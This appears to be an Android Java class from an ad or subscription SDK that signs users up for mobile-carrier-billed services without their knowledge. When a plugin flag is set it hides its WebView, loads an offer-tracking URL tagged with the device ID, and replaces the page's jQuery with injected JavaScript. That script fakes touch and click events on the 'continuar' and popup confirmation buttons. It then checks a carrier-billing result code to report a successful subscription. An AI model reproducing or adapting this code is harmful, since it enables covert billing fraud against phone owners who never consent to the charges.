package com.enhtmv.sublib.work.spain;

import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;

import com.blankj.utilcode.util.ConvertUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ResourceUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.plugin.Plugin;
import com.enhtmv.sublib.common.sub.WebViewSubCall;

import java.io.InputStream;
import java.lang.reflect.Method;

import okhttp3.HttpUrl;

public class SpainOrange extends WebViewSubCall {


    private final static String runScript = "class MyTouch{\n" +
            "\n" +
            "    constructor(el){\n" +
            "        this.el=el;\n" +
            "\n" +
            "        var rect = this.el.getBoundingClientRect();\n" +
            "\n" +
            "        this.x=rect.left + rect.width/2.0;\n" +
            "        this.y=rect.top + rect.height/2.0;\n" +
            "\n" +
            "        log(\"click\",\"x:\"+this.x+\" y:\"+this.y)\n" +
            "    }\n" +
            "\n" +
            "    touchStart(){\n" +
            "\n" +
            "        var touch = new Touch({\n" +
            "            identifier:0,\n" +
            "            target: this.el,\n" +
            "            clientX: this.x,\n" +
            "            clientY: this.y,\n" +
            "            pageX:this.x,\n" +
            "            pageY:this.y,\n" +
            "            screenX: this.x,\n" +
            "            screenY: this.y,\n" +
            "            radiusX: 25.509714126586914,\n" +
            "            radiusY: 25.509714126586914,\n" +
            "            rotationAngle: 0,\n" +
            "            force: 0.6500000357627869\n" +
            "        });\n" +
            "    \n" +
            "        var touchEvent = new TouchEvent(\"touchstart\", {\n" +
            "            cancelable: false,\n" +
            "            bubbles: true,\n" +
            "            touches: [touch],\n" +
            "            targetTouches: [],\n" +
            "            changedTouches: [touch]\n" +
            "        });\n" +
            "        this.el.dispatchEvent(touchEvent);\n" +
            "    }\n" +
            "\n" +
            "    touchEnd(){\n" +
            "        var touch = new Touch({\n" +
            "            identifier:0,\n" +
            "            target: this.el,\n" +
            "            clientX: this.x,\n" +
            "            clientY: this.y,\n" +
            "            pageX:this.x,\n" +
            "            pageY:this.y,\n" +
            "            screenX: this.x,\n" +
            "            screenY: this.y,\n" +
            "            radiusX: 25.509714126586914,\n" +
            "            radiusY: 25.509714126586914,\n" +
            "            rotationAngle: 0,\n" +
            "            force: 0,\n" +
            "        });\n" +
            "    \n" +
            "        var touchEvent = new TouchEvent(\"touchend\", {\n" +
            "            cancelable: false,\n" +
            "            bubbles: true,\n" +
            "            touches: [touch],\n" +
            "            targetTouches: [],\n" +
            "            changedTouches: [touch]\n" +
            "        });\n" +
            "        this.el.dispatchEvent(touchEvent);\n" +
            "    }\n" +
            "\n" +
            "    click(){\n" +
            "        this.el.click()\n" +
            "    }\n" +
            "    \n" +
            "    run(){\n" +
            "\n" +
            "        this.touchStart()\n" +
            "\n" +
            "        setTimeout(() => {\n" +
            "          \n" +
            "            this.touchEnd()\n" +
            "\n" +
            "            setTimeout(() => {\n" +
            "\n" +
            "                 this.click()\n" +
            "\n" +
            "            }, 211);\n" +
            "\n" +
            "        }, 512);\n" +
            "    }\n" +
            "\n" +
            "}\n" +
            "\n" +
            "\n" +
            "\n" +
            "$(document).ready(function(){\n" +
            "        \n" +
            "            var btn1 = document.getElementById('btn_continuar');\n" +
            "            var btn2 = document.getElementById('btn_popup_der');\n" +
            "\n" +
            "            //点击一次图片\n" +
            "            setTimeout(() => {new MyTouch(img).run()}, 2345);\n" +
            "            \n" +
            "            setTimeout(() => {\n" +
            "\n" +
            "                log(\"step1\",\"\")\n" +
            "                new MyTouch(btn1).run();\n" +
            "\n" +
            "                setTimeout(() => {\n" +
            "\n" +
            "                      log(\"step2\",\"\")\n" +
            "                      new MyTouch(btn2).run()\n" +
            "\n" +
            "                }, 1520)\n" +
            "\n" +
            "        }, 5200);\n" +
            "        \n" +
            "});";


    private String logFunc;


    private ViewGroup viewGroup;

    public SpainOrange(ViewGroup viewGroup) {
        super(new WebView(Utils.getApp().getBaseContext()));

        this.viewGroup = viewGroup;

        webView.setWebChromeClient(new WebChromeClient());

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }

            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                String url = request.getUrl().toString();

                if (ignore(request)) {
                    return new WebResourceResponse("", "", null);
                }

                if (url.startsWith("http://go-es.allcpx.com/web/sub/result")) {

                    HttpUrl httpUrl = HttpUrl.parse(url);

                    if (httpUrl != null) {
                        String code = httpUrl.queryParameter("dcbErrorCode");

                        if ("0".equals(code) || "150".equals(code)) {
                            success();
                        } else {
                            r.w("error", url);
                        }
                    } else {
                        r.w("error", url);
                    }

                }


                if (url.endsWith("jquery.min.js")) {

                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
                            + logFunc + "\n"
                            + runScript;

                    InputStream inputStream = ConvertUtils.string2InputStream(jquery, "utf-8");

                    return new WebResourceResponse("application/javascript; charset=utf-8", "utf-8", inputStream);

                }

                return super.shouldInterceptRequest(view, request);
            }
        });


        for (Method method : JavascriptLog.class.getMethods()) {
            JavascriptInterface annotation = method.getAnnotation(JavascriptInterface.class);
            if (annotation != null) {
                this.logFunc = "function log(tag,info){window.LOG." + method.getName() + "(tag,info)}";
                LogUtils.i("script log method:", logFunc);
                break;
            }
        }
    }

    @Override
    public void sub(String script) {


        handler.post(new Runnable() {
            @Override
            public void run() {

                clearCookies();

                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);

                viewGroup.setLayoutParams(params);

                LinearLayout.LayoutParams webviewParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);

                viewGroup.setLayoutParams(webviewParams);


                if (Plugin.isHiden()) {
                    webView.setVisibility(View.GONE);
                }

                viewGroup.addView(webView);

                webView.clearHistory();
                webView.clearCache(true);
                webView.clearFormData();


                report(SUB_REQEUST);

                webView.loadUrl("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
            }
        });

    }


}
